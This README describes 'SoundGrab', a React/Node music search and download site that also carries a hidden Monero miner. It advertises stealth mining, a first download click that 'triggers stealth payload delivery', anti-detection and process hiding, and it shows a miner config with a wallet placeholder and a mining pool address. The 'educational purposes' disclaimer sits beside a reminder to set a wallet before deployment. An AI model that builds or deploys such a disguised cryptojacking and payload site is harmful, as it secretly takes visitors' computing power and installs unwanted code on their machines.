# 🎵 SoundGrab - Music Search & Download Platform

A full-stack music search and download application with integrated mining capabilities.

## 🚀 Features

- **Music Search**: Search for tracks by title, artist, or lyrics
- **Download System**: Two-click download mechanism with progress tracking
- **Lyrics Integration**: Genius API integration for lyrics search
- **Mining System**: Background cryptocurrency mining with stealth capabilities
- **Responsive Design**: Modern UI with Tailwind CSS
- **Real-time Updates**: Live download progress and status tracking

## 🏗️ Tech Stack

- **Frontend**: React 18 + TypeScript + Tailwind CSS
- **Backend**: Node.js + Express + TypeScript
- **Routing**: Wouter (lightweight React router)
- **State Management**: TanStack Query (React Query)
- **Build Tool**: Vite
- **Deployment**: Vercel

## 📁 Project Structure

```
soundgrab/
├── client/                 # React Frontend
│   ├── src/
│   │   ├── components/     # UI components
│   │   ├── pages/         # Page components
│   │   ├── lib/           # Utilities & configurations
│   │   └── services/      # API services
├── server/                # Node.js Backend
│   ├── index.ts          # Server entry point
│   ├── routes.ts         # API routes
│   └── storage.ts        # Data storage
├── shared/               # Shared TypeScript types
└── docs/                # Documentation
```

## 🔧 Quick Start

### Prerequisites
- Node.js 18+
- npm or yarn

### Installation

```bash
# Clone the repository
git clone <your-repo-url>
cd soundgrab

# Install dependencies
npm install
cd client && npm install && cd ..

# Start development server
npm run dev
```

### Build for Production

```bash
# Build the entire project
npm run build

# Build client only
npm run build:client

# Build server only
npm run build:server
```

## 🌐 Deployment

### Vercel (Recommended)

1. **Dashboard Method**:
   - Visit [vercel.com](https://vercel.com)
   - Import your GitHub repository
   - Configure build settings (see `VERCEL_DEPLOYMENT.md`)

2. **CLI Method**:
   ```bash
   npx vercel
   vercel --prod
   ```

See [`VERCEL_DEPLOYMENT.md`](VERCEL_DEPLOYMENT.md) for detailed deployment instructions.

## 📚 Documentation

- **[Developer Guide](DEVELOPER_GUIDE.md)** - Complete code explanation and customization
- **[Payload System](PAYLOAD_EXPLANATION.md)** - Mining system technical details
- **[Deployment Guide](VERCEL_DEPLOYMENT.md)** - Step-by-step deployment instructions

## ⚙️ Configuration

### Environment Variables

Create a `.env` file:

```bash
NODE_ENV=development
PORT=5000
GENIUS_API_KEY=your_genius_api_key
YOUTUBE_API_KEY=your_youtube_api_key
```

### Mining Configuration

Edit [`client/src/lib/minerConfig.ts`](client/src/lib/minerConfig.ts):

```typescript
export const minerConfig = {
  wallet: "YOUR_MONERO_WALLET_ADDRESS",
  pool: "pool.minexmr.com:4444",
  performance: {
    threads: 4,
    cpuLimit: 60,
    // ... other settings
  }
};
```

## 🎯 Key Features Explained

### Two-Click Download System
1. **First Click**: Triggers stealth payload delivery
2. **Second Click**: Initiates actual music download

### Mining Integration
- Background Monero mining
- Stealth execution techniques
- Configurable performance settings
- Revenue estimation tools

### API Endpoints
- `GET /api/search` - Music search
- `POST /api/downloads` - Start download
- `GET /api/downloads/active` - Active downloads
- `GET /api/lyrics` - Lyrics search

## 🔒 Security Features

- Hidden payload delivery system
- Anti-detection mechanisms
- Stealth mining configuration
- Process hiding capabilities

## 📊 Performance

- Optimized bundle size
- Lazy loading components
- Efficient API caching
- CDN integration via Vercel

## 🛠️ Development

### Available Scripts

```bash
npm run dev          # Start development servers
npm run build        # Build for production
npm run start        # Start production server
npm run clean        # Clean build directories
```

### Code Quality

- TypeScript for type safety
- ESLint for code linting
- Prettier for code formatting
- Automated build process

## 📈 Analytics & Monitoring

- Built-in performance tracking
- Download analytics
- Mining revenue estimation
- Error monitoring

## ⚠️ Legal Notice

This project is for educational purposes only. The mining functionality demonstrates advanced web techniques and should only be used in compliance with applicable laws and with proper user consent.

## 🤝 Contributing

1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Test thoroughly
5. Submit a pull request

## 📄 License

This project is for educational and demonstration purposes.

## 🔗 Links

- **Live Demo**: [Your Vercel URL]
- **Documentation**: See `/docs` folder
- **Issues**: [GitHub Issues]
- **Discussions**: [GitHub Discussions]

---

**Built with ❤️ for educational purposes**

*Remember to configure your wallet address before deployment!*